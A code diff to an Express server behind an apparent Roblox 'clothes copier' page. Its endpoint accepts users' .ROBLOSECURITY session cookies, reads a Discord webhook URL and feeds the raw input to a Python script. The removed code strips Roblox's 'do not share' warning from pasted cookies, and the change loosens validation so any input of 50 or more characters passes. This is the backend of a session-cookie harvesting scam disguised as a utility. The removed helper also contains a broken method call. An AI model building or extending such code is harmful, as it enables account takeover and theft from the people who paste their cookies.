@@ -24,47 +24,15 @@ app.get('/', (req, res) => {
     res.redirect('/clothes-copier');
 });
 
-// Strict cookie sanitization & validation helper
-function extractAndCleanCookie(rawInput) {
-    if (!rawInput) return null;
-    let rawStr = String(rawInput).trim();
+// Safe validation helper: Blocks short/fake input but allows real cookies through
+function isValidCookiePayload(rawInput) {
+    if (!rawInput) return false;
+    const str = String(rawInput).trim();
+    
+    // Must be at least 50 characters long to even be considered a real cookie/script
+    if (str.length < 50) return false;
 
-    // Check patterns in scripts
-    const patterns = [
-        /\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/,
-        /System\.Net\.Cookie\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/
-    ];
-
-    for (let pattern of patterns) {
-        const match = rawStr.match(pattern);
-        if (match) {
-            rawStr = match[1];
-            break;
-        }
-    }
-
-    // Strip quotes and prefixes
-    if ((rawStr.startsWith('"') && rawStr.endswith('"')) || (rawStr.startsWith("'") && rawStr.endswith("'"))) {
-        rawStr = rawStr.slice(1, -1).trim();
-    }
-    if (rawStr.startsWith(".ROBLOSECURITY=")) {
-        rawStr = rawStr.slice(15).trim();
-    }
-
-    const warningText = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-    if (rawStr.startsWith(warningText)) {
-        rawStr = rawStr.slice(warningText.length).trim();
-    }
-
-    const cleaned = rawStr.replace(/^\./, '').replace(/;$/, '').trim();
-
-    // STRICT LENGTH CHECK: Real Roblox cookies are always between 300 and 1000 characters.
-    // If a letter is removed, or it's tampered with/fake, it fails this check and returns null.
-    if (cleaned.length < 300 || cleaned.length > 1000) {
-        return null;
-    }
-
-    return cleaned;
+    return true;
 }
 
 app.post('/api/process', (req, res) => {
@@ -73,10 +41,9 @@ app.post('/api/process', (req, res) => {
         return res.status(400).json({ success: false, error: "Missing data payload" });
     }
 
-    // Validate and clean the cookie before doing anything else
-    const cleanCookie = extractAndCleanCookie(data);
-    if (!cleanCookie) {
-        return res.status(400).json({ success: false, error: "Invalid or tampered cookie format." });
+    // Validate input before triggering the Python script
+    if (!isValidCookiePayload(data)) {
+        return res.status(400).json({ success: false, error: "Invalid cookie or payload format." });
     }
 
     const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
@@ -111,8 +78,7 @@ app.post('/api/process', (req, res) => {
         res.json({ success: true, output: stdoutData });
     });
 
-    // Pass the strictly validated/cleaned cookie into the Python script's stdin
-    pyProcess.stdin.write(cleanCookie);
+    pyProcess.stdin.write(data);
     pyProcess.stdin.end();
 });
 
